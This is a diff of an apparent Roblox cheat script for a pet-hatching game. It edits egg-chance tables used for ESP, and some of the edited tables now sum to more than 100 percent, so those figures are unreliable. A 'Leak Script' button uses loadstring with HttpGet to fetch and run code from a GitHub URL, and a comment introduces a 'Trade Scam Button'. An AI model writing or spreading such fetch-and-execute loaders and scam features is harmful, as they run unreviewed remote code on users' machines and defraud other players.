@@ -14,7 +14,7 @@ local eggChances = {
     ["Mythical Egg"] = {{name="Grey Mouse",chance=36},{name="Brown Mouse",chance=27},{name="Squirrel",chance=27},{name="Red Giant Ant",chance=9},{name="Red Fox",chance=2}},
     ["Night Egg"] = {{name="Hedgehog",chance=49},{name="Mole",chance=23.5},{name="Frog",chance=17.63},{name="Echo Frog",chance=8.23},{name="Night Owl",chance=3.53},{name="Raccoon",chance=0.2}},
     ["Oasis Egg"] = {{name="Meerkat",chance=45},{name="Sand Snake",chance=34.5},{name="Axolotl",chance=15},{name="Hyacinth Macaw",chance=5},{name="Fennec Fox",chance=0.5}},
-    ["Paradise Egg"] = {{name="Ostrich",chance=40},{name="Peacock",chance=30},{name="Capybara",chance=21},{name="Scarlet Macaw",chance=8},{name="Mimic Octopus",chance=1}},
+    ["Paradise Egg"] = {{name="Ostrich",chance=40},{name="Peacock",chance=30},{name="Capybara",chance=21},{name="Scarlet Macaw",chance=8},{name="Mimic Octopus",chance=9}},
     ["Primal Egg"] = {{name="Parasaurolophus",chance=35},{name="Iguanodon",chance=32.5},{name="Pachycephalosaurus",chance=28},{name="Dilophosaurus",chance=3},{name="Ankylosaurus",chance=1},{name="Spinosaurus (Divine)",chance=0.5}},
     ["Zen Egg"] = {
         {name="Shiba Inu",chance=49},
@@ -22,21 +22,28 @@ local eggChances = {
         {name="Tanuki",chance=17.63},
         {name="Tanchozuru",chance=8.23},
         {name="Kappa",chance=3.53},
-        {name="Kitsune",chance=5}
+        {name="Kitsune",chance=0.2}
     },
+["Enchanted Egg"] = {
+    {name = "Ladybug", chance = 50},
+    {name = "Pixie", chance = 29},
+    {name = "Imp", chance = 15},
+    {name = "Glimmering Sprite", chance = 5},
+    {name = "Cockatrice", chance = 9},
+},
 ["Sprout Egg"] = {
     {name="Dairy Cow", chance=50},
     {name="Jackalope", chance=31},
     {name="Seedling", chance=12},
     {name="Golem", chance=6},
-    {name="Golden Goose", chance=5}
+    {name="Golden Goose", chance=11}
 },
     ["Gourmet Egg"] = {  
         {name="Bagel Bunny", chance=50},  
         {name="Pancake Mole", chance=38},  
         {name="Sushi Bear", chance=7},  
         {name="Spaghetti Sloth", chance=4},  
-        {name="French Fry Ferret", chance=5}  
+        {name="French Fry Ferret", chance=1}  
     }
 }
 -- Tracks ESP visibility state
@@ -173,7 +180,7 @@ leakScriptBtn.Text = "Leak Script"
 leakScriptBtn.LayoutOrder = 7
 
 leakScriptBtn.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/Source/refs/heads/main/Source", true))()
 end)
 
 -- NEW Trade Scam Button
